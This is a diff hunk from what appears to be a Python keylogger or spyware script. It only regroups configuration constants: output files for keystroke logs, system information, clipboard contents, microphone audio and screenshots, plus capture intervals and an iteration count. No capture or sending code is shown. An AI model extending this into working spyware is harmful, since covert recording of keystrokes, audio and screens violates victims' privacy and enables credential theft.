@@ -47,13 +47,14 @@ extend = "\\"
 file_merge = file_path + extend
 key = " "  # # Generate an encryption key from the Cryptography folder 
 
-keys_information =  "key_log.txt"         #Stored Keylog Files
-system_information = "systeminfo.txt"     #Stored System info Files
-clipboard_info = "Clipboard.txt"          #Stored Clipboard files
-microphone_time = 10                      #Time in seconds of recording recorded
-audio_information = "audio.wav"           #Stored Audio Files
-screenshot_information = "screenshoot.png"
-time_iteration = 15
+keys_information =  "key_log.txt"                  #Stored Keylog Files
+system_information = "systeminfo.txt"              #Stored System info Files
+clipboard_info = "Clipboard.txt"                   #Stored Clipboard files
+audio_information = "audio.wav"                    #Stored Audio Files
+screenshot_information = "screenshoot.png"         #Store Screenshoot
+
+microphone_time = 10                               #Time in seconds of recording recorded
+time_iteration = 15                                # Every 15seconds data from the clipboad a screenshoot of the computer monitor is taken
 number_of_iterations_end = 3
 
 #Encrypted Files
